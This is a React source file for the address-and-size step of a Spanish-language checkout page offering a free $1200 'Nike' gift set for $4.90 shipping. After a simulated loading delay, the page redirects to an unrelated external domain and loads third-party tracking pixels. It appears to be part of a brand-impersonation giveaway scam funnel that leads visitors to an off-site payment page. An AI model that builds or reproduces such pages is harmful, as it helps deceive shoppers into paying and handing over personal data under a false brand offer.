import React, { useState, useEffect } from 'react';
import Header from '../../componentes/header/Header';
import './style.css';
import presentes from '../../assets/carousel/main.jpeg';
import { useNavigate } from 'react-router-dom';
import { redirectWithUTM } from '../../utils/redirectWithUTM';



export default function Entrega() {
  const navigate = useNavigate();
  const [error, setError] = useState(''); // Estado para armazenar a mensagem de erro
  const [isLoading, setIsLoading] = useState(false);
  // Estados para armazenar os valores dos campos
  const [direccion, setDireccion] = useState('');
  const [apto, setApto] = useState('');
  const [codigoPostal, setCodigoPostal] = useState('');
  const [ciudad, setCiudad] = useState('');
  const [height, setHeight] = useState(window.innerHeight);
  const [tallaSeleccionada, setTallaSeleccionada] = useState('');


  const tamanhos = [
    { label: "CM 24 (US 6)", valor: 24, disponivel: true },
    { label: "CM 24.5", valor: 24.5, disponivel: true },
    { label: "CM 25", valor: 25, disponivel: true },
    { label: "CM 25.5", valor: 25.5, disponivel: true },
    { label: "CM 26", valor: 26, disponivel: true },
    { label: "CM 26.5", valor: 26.5, disponivel: true },
    { label: "CM 27", valor: 27, disponivel: true },
    { label: "CM 27.5", valor: 27.5, disponivel: true },
    { label: "CM 28", valor: 28, disponivel: true },
    { label: "CM 28.5", valor: 28.5, disponivel: true },
    { label: "CM 29", valor: 29, disponivel: true },
    { label: "CM 29.5", valor: 29.5, disponivel: true },
    { label: "CM 30", valor: 30, disponivel: true },
    { label: "CM 30.5", valor: 30.5, disponivel: true },
    { label: "CM 31", valor: 31, disponivel: true },
    { label: "CM 32", valor: 32, disponivel: true },
  ];
  

  const handleClick = () => {
    // Verifica se os campos obrigatórios estão preenchidos
    if (!direccion || !codigoPostal || !ciudad) {
      setError('Por favor, completa todos los campos obligatorios.'); // Mensagem de erro em espanhol
      return; // Impede o redirecionamento
    }
  
    // Inicia o loading
    setIsLoading(true);
  
    // Simula um tempo de carregamento antes de redirecionar
    setTimeout(() => {
      redirectWithUTM("https://centraldecontenido.online/cwuns/"); // Redireciona para o link externo
    }, 3000); // 3 segundos de simulação de carregamento
  };

  const startLoading = (callback) => {
    setIsLoading(true); // Ativa o loading
    setTimeout(() => {
      setIsLoading(false); // Desativa o loading após 2 segundos
      if (callback) callback(); // Executa o callback (navegação)
    }, 2000);
  };

  useEffect(() => {
    const updateHeight = () => {
      setHeight(window.innerHeight);
    };
    window.addEventListener('resize', updateHeight);
    return () => window.removeEventListener('resize', updateHeight);
  }, []);

  return (
    <>
      <Header naoexibir={true} />
      <div className="circles-container">
        <div className="containerCircleText">
          <div className="circle" id="circle1">1</div>
          <p>Selección</p>
        </div>
        <div className="line"></div>
        <div className="containerCircleText">
          <div className="circle" id="circle2">2</div>
          <p>Información<br /> del pedido</p>
        </div>
        <div className="line linha2"></div>
        <div className="containerCircleText">
          <div className="circle" id="circle3">3</div>
          <p>Pago</p>
        </div>
      </div>

      <div className='imagemValor'>
        <img src={presentes} alt="Presentes" />
        <div className='containerTexto'>
          <p>Set de regalos Nike</p>
          <p className='valor'><span>$ 1200</span>&nbsp;&nbsp;&nbsp;Sin costo</p>
        </div>
      </div>
      <div className='detalhesPedido'>
        <h3>Detalles del pedido</h3>
        <div className='textoEspacado'>
          <p>Precio del producto</p>
          <p>Sin costo</p>
        </div>
        <div className='textoEspacado'>
          <p>Costo de envío</p>
          <p>$ 4.90</p>
        </div>
        <div className='textoEspacado textoBold'>
          <p>Total</p>
          <p>$ 4.90</p>
        </div>
      </div>

      <form>
      <div>
      <h3>Selecciona tu talla</h3>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px" }}>
        {tamanhos.map((tamanho, index) => (
          <button
            key={index}
            disabled={!tamanho.disponivel}
            style={{
              padding: "10px",
              cursor: tamanho.disponivel ? "pointer" : "not-allowed",
              opacity: tamanho.disponivel ? 1 : 0.5,
            }}
          >
            {tamanho.label}
          </button>
        ))}
      </div>
    </div>
     
      <div className="tallas-wrapper">
  <label>Seleccione su talla de ropa</label>
  <div className="botones-talla">
    {['XS', 'S', 'M', 'L', 'XL', 'XXL'].map((talla) => (
      <button
        type="button"
        key={talla}
        className={`boton-talla ${tallaSeleccionada === talla ? 'seleccionado' : ''}`}
        onClick={() => setTallaSeleccionada(talla)}
      >
        {talla}
      </button>
    ))}
  </div>
</div>
        <div>
          <label htmlFor="direccion">Dirección</label>
          <input
            type="text"
            id="direccion"
            placeholder="Calle y número"
            value={direccion}
            onChange={(e) => setDireccion(e.target.value)}
            required
          />
        </div>

        <div>
          <label htmlFor="apto">Apto, piso, casa, etc. (Opcional)</label>
          <input
            type="text"
            id="apto"
            placeholder="Apartamento, piso, etc"
            value={apto}
            onChange={(e) => setApto(e.target.value)}
          />
        </div>

        <div>
          <label htmlFor="codigoPostal">Código postal (C.P)</label>
          <input
            type="text"
            id="codigoPostal"
            placeholder="Introduce aquí tu Código Postal"
            value={codigoPostal}
            onChange={(e) => setCodigoPostal(e.target.value)}
            required
          />
        </div>

        <div>
          <label htmlFor="ciudad">Ciudad</label>
          <input
            type="text"
            id="ciudad"
            placeholder="¿Dónde vives?"
            value={ciudad}
            onChange={(e) => setCiudad(e.target.value)}
            required
          />
        </div>

        {/* Exibe a mensagem de erro se houver */}
        {error && <p className="error-message">{error}</p>}

        {/* Botão que redireciona */}
        <button type="button" onClick={handleClick}>
          Proceder al pago
        </button>
      </form>

      {/* Tela de carregamento */}
      <div className='telaCarregamentoContainer' style={{ display: isLoading ? 'flex' : 'none', height: height }}>
        <div className="loader"></div>


        <script>
window.pixelId = "676a054f402f32fdec2f7281";
var a = document.createElement("script");
a.setAttribute("async", "");
a.setAttribute("defer", "");
a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
document.head.appendChild(a);
</script>
<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer>
</script>






      </div>
    </>
  );
}